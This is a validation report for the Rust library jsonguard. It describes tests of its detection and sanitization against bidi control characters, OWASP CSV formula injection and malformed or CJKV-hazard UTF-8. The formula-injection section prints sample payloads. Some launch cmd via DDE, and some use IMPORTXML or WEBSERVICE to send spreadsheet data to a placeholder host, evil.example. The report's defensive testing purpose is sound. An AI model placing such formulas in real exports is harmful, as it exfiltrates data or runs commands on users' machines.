# Validation Report

Correctness analysis of jsonguard against authoritative external attack corpora. Every claim here is reproducible from the test suite via `cargo test --test real_world_samples`.

## Test Environment

| Component | Version | Source |
|-----------|---------|--------|
| jsonguard | 0.1.0 (167 tests) | [crates.io](https://crates.io/crates/jsonguard) |
| Rust (rustc) | 1.75+ (MSRV) | [rustup.rs](https://rustup.rs/) |
| Platform | macOS Darwin 24.6.0, arm64 | — |

## Methodology

Each attack class is validated in two independent ways:

1. **`inspect()`** — passive scan that returns `Findings` with per-violation `byte_offset` and `char`. Confirms the dangerous pattern is detected before sanitization.
2. **Output sanitizers** (`csv_field`, `tsv_safe`, `jsonl_safe`, `display_safe`) — confirms that the sanitized output no longer contains the dangerous pattern.

Both must hold for a claim to pass. A sanitizer that strips without detection (or detects without sanitizing) is flagged as a gap.

Integration tests are in [`tests/real_world_samples.rs`](../tests/real_world_samples.rs). Corpus files are embedded at compile time via `include_str!` / `include_bytes!` and committed to the repository so CI never fetches them at test time.

---

## Corpus 1 — Unicode Bidi Control Characters

### Source

| File | Size | URL |
|------|------|-----|
| `tests/corpus/BidiCharacterTest.txt` | 6,880,771 bytes | [Unicode UCD 17.0.0](https://www.unicode.org/Public/UCD/latest/ucd/BidiCharacterTest.txt) |
| `tests/corpus/BidiTest.txt` | 7,959,988 bytes | [Unicode UCD 17.0.0](https://www.unicode.org/Public/UCD/latest/ucd/BidiTest.txt) |
| `tests/corpus/bidi_samples.txt` | 174 bytes | Handcrafted attack strings with embedded real codepoints |

`BidiCharacterTest.txt` is the Unicode Consortium's official conformance test for the Unicode Bidirectional Algorithm (UBA, [Unicode TR#9](https://unicode.org/reports/tr9/)). Each data line specifies a codepoint sequence, paragraph direction, resolved embedding levels, and expected reorder indices. We extract lines whose codepoint sequence contains U+202E (RIGHT-TO-LEFT OVERRIDE) and reconstruct the strings from the hex fields.

### What is tested (7 tests)

| Test | Assertion |
|------|-----------|
| `bidi_char_test_loads` | File is ≥ 1,000 data lines (corpus integrity sanity check) |
| `inspect_detects_bidi_in_rlo_corpus_lines` | First 50 UCD lines containing U+202E: `inspect().has_bidi() == true`, `is_csv_safe() == false`, `is_display_safe() == false` |
| `display_safe_strips_rlo_from_corpus_lines` | First 20 UCD RLO lines: U+202E absent from `display_safe()` output |
| `csv_field_sanitizes_rlo_from_corpus_lines` | First 20 UCD RLO lines: U+202E absent from `csv_field()` output |
| `jsonl_safe_encodes_rlo_as_unicode_escape` | First 10 UCD RLO lines: no raw U+202E; `‮` present as JSON escape |
| `bidi_samples_file_loads` | Handcrafted file is ≥ 50 bytes (corpus integrity sanity check) |
| `inspect_detects_bidi_in_all_attack_samples` | Every line in `bidi_samples.txt` containing a bidi codepoint is flagged by `inspect()` |
| `display_safe_strips_bidi_from_attack_samples` | Every line in `bidi_samples.txt`: none of the 10 known bidi codepoints appear in `display_safe()` output |

### Bidi codepoints tested

U+200E (LRM), U+200F (RLM), U+202A–U+202E (LRE, RLE, PDF, LRO, RLO), U+2066–U+2069 (LRI, RLI, FSI, PDI), U+061C (Arabic Letter Mark).

---

## Corpus 2 — OWASP Formula Injection Payloads

### Source

| File | Size | URL |
|------|------|-----|
| `tests/corpus/formula_injection.csv` | 293 bytes | [OWASP CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection) |

Samples:
```
=HYPERLINK("https://evil.example","Click here")
=cmd|'/C calc'!A0
+cmd|'/C calc'!A0
-2+3+cmd|'/C calc'!A0
@SUM(1+1)*cmd|'/C calc'!A0
=IMPORTXML(CONCAT("http://evil.example/steal?",CONCATENATE(A2:E2)),"//")
=WEBSERVICE("https://evil.example/?data="&A1)
DDE("cmd","/C calc","__DDE_Remote")
```

### What is tested (5 tests)

| Test | Assertion |
|------|-----------|
| `formula_csv_loads` | File has ≥ 7 samples (corpus integrity sanity check) |
| `inspect_flags_all_formula_lines` | Every line starting with `= + - @`: `has_formula() == true`, `is_csv_safe() == false`. ≥ 6 such lines confirmed. |
| `csv_field_sanitizes_all_formula_lines` | First non-quote character of `csv_field()` output is `'` (apostrophe guard) for all formula lines |
| `tsv_safe_sanitizes_all_formula_lines` | First character of `tsv_safe()` output is `'` for all formula lines |
| `dde_line_not_flagged_as_formula` | `DDE(...)` line (first char `D`) is NOT flagged as `FormulaInjection`; `csv_field()` does NOT prepend apostrophe |

### Known detection limit

DDE (Dynamic Data Exchange) attacks that do not start with `= + - @` are **not** caught by `inspect().has_formula()` — the first-char heuristic follows spreadsheet conventions for formula detection. `csv_field()` still properly quotes and escapes the field content, preventing column injection. Applications handling DDE-sensitive targets (Microsoft Excel on Windows) should add application-level DDE detection on top of jsonguard.

---

## Corpus 3 — Markus Kuhn UTF-8 Stress Test

### Source

| File | Size | URL |
|------|------|-----|
| `tests/corpus/UTF-8-test.txt` | 22,781 bytes | [Markus Kuhn, Cambridge](https://www.cl.cam.ac.uk/~mgk25/ucs/examples/UTF-8-test.txt) |

Kuhn's stress test is the canonical external reference for UTF-8 decoder robustness. It contains deliberately invalid sequences across every known category of UTF-8 malformation. `std::str::from_utf8` rejects the file (verified statically by the compiler), confirming the corpus is genuinely invalid.

### What is tested (4 tests)

| Test | Assertion |
|------|-----------|
| `utf8_test_file_loads` | File is ≥ 10,000 bytes (corpus integrity sanity check) |
| `inspect_reports_invalid_utf8_in_stress_test` | `inspect(bytes).has_invalid_utf8() == true`; `lossy == true` |
| `inspect_reports_multiple_invalid_sequences_in_stress_test` | ≥ 10 distinct `InvalidUtf8` violations (not just one catch-all) |
| `display_safe_handles_stress_test_file` | `display_safe(bytes)` does not panic; `lossy == true`; output is a valid Rust `String` |
| `jsonl_safe_produces_valid_json_string_for_stress_test` | Output starts and ends with `"`. Every `\` in the inner content is followed by a valid JSON escape character (`"`, `\`, `/`, `b`, `f`, `n`, `r`, `t`, `u`). No raw unescaped backslash can appear. |

---

## Corpus 4 — CJKV Encoding Hazards and Malformed UTF-8

### Source

Handcrafted inline byte sequences, each drawn from Kuhn's taxonomy or documented CJKV encoding hazards.

| Sequence | Description | Source |
|----------|-------------|--------|
| `\xB3\x5C` | Big5 encoding of 許 — second byte is ASCII `\` | [Big5 code chart](https://en.wikipedia.org/wiki/Big5) |
| `\xD0\xC2\x5C` | GBK sequence ending in `\x5C` | GBK encoding tables |
| `\xC0\x80` | Overlong encoding of U+0000 (NUL) | [RFC 3629 §10](https://www.rfc-editor.org/rfc/rfc3629#section-10) |
| `\xED\xA0\x80` | Surrogate U+D800, banned by RFC 3629 | [RFC 3629 §3](https://www.rfc-editor.org/rfc/rfc3629#section-3) |
| `\xF4\x90\x80\x80` | Above U+10FFFF (maximum Unicode codepoint) | [Unicode §2.4](https://www.unicode.org/versions/Unicode15.0.0/ch02.pdf) |
| `\xFF\xFE` | UTF-16 BOM bytes — invalid UTF-8 | [UTF-8 definition](https://www.rfc-editor.org/rfc/rfc3629) |
| `\x80` | Isolated continuation byte without lead byte | Kuhn §4.1 |

### What is tested (14 tests)

| Test | Assertion |
|------|-----------|
| `inspect_flags_big5_as_invalid_utf8` | `\xB3\x5C`: `has_invalid_utf8() == true`, `lossy == true` |
| `inspect_flags_gbk_as_invalid_utf8` | `\xD0\xC2\x5C`: `has_invalid_utf8() == true`, `lossy == true` |
| `jsonl_safe_big5_no_raw_backslash_hazard` | `jsonl_safe(b"\xB3\x5C")`: every `\` in output is a valid JSON escape. The `0x5C` byte that survived lossy decode as ASCII `\` must be re-escaped as `\\`. `lossy == true`. |
| `jsonl_safe_gbk_no_raw_backslash_hazard` | Same invariant for `\xD0\xC2\x5C` |
| `csv_field_big5_no_raw_backslash_in_output` | `csv_field(b"\xB3\x5C")`: `lossy == true` (caller is informed) |
| `display_safe_big5_strips_no_extra_ascii` | `display_safe(b"\xB3\x5C")`: does not panic; `lossy == true` |
| `inspect_overlong_nul_c0_80` | `\xC0\x80`: `has_invalid_utf8() == true` |
| `inspect_surrogate_ed_a0_80` | `\xED\xA0\x80`: `has_invalid_utf8() == true` |
| `inspect_above_unicode_max_f4_90_80_80` | `\xF4\x90\x80\x80`: `has_invalid_utf8() == true` |
| `inspect_ff_fe_bom_like` | `\xFF\xFE`: `has_invalid_utf8() == true` |
| `inspect_isolated_continuation_byte` | `\x80`: `has_invalid_utf8() == true` |
| `inspect_valid_utf8_str_not_flagged` | `"hello"`, `"許功蓋"`, `"Ünïcödé"`, `"日本語"`, `"😀"`: `has_invalid_utf8() == false`, `lossy == false` (no false positives) |

### The CJKV backslash hazard (why this matters)

Big5-encoded 許 is the bytes `\xB3\x5C`. When a naive system reads these bytes and writes them into a JSON or CSV string without first validating UTF-8, the `\x5C` byte appears as a raw backslash. In JSON, a raw unescaped backslash is illegal and produces parser errors or injection. In CSV, a backslash before a quote can break field boundary parsing in non-RFC-4180-compliant readers.

jsonguard's defence is the decode-first architecture: `GuardInput` for `&[u8]` runs `String::from_utf8_lossy` before any sanitizer sees the bytes. `\xB3` becomes U+FFFD and `\x5C` becomes the Unicode character `\` (U+005C). `jsonl_safe` then escapes U+005C as `\\`, and `csv_field` never sees a raw byte — only a Unicode code point. The `lossy == true` flag signals that the input had undecodable bytes, allowing callers to log or reject records where data fidelity is critical.

---

## Summary

| Attack class | Corpus lines tested | inspect() | Sanitizer |
|---|---:|:---:|:---:|
| Bidi override (U+202E) | 50 (UCD 17) | ✓ | ✓ strip/escape |
| Bidi override (all 10 codepoints) | 8 handcrafted | ✓ | ✓ strip |
| Formula injection (`= + - @`) | 7 (OWASP) | ✓ | ✓ `'`-prefix |
| DDE (no formula trigger) | 1 | n/a (documented limit) | ✓ quoted/escaped |
| Invalid UTF-8 (Kuhn stress test) | 22,781 bytes | ✓ (≥10 distinct) | ✓ no panic |
| Big5 `\x5C` second byte | inline | ✓ | ✓ backslash re-escaped |
| GBK `\x5C` second byte | inline | ✓ | ✓ backslash re-escaped |
| Overlong NUL (`\xC0\x80`) | inline | ✓ | — |
| Surrogate (`\xED\xA0\x80`) | inline | ✓ | — |
| Above U+10FFFF | inline | ✓ | — |
| BOM-like (`\xFF\xFE`) | inline | ✓ | — |
| Isolated continuation (`\x80`) | inline | ✓ | — |
| Valid UTF-8 (false positive check) | 5 strings | ✓ no false pos | — |
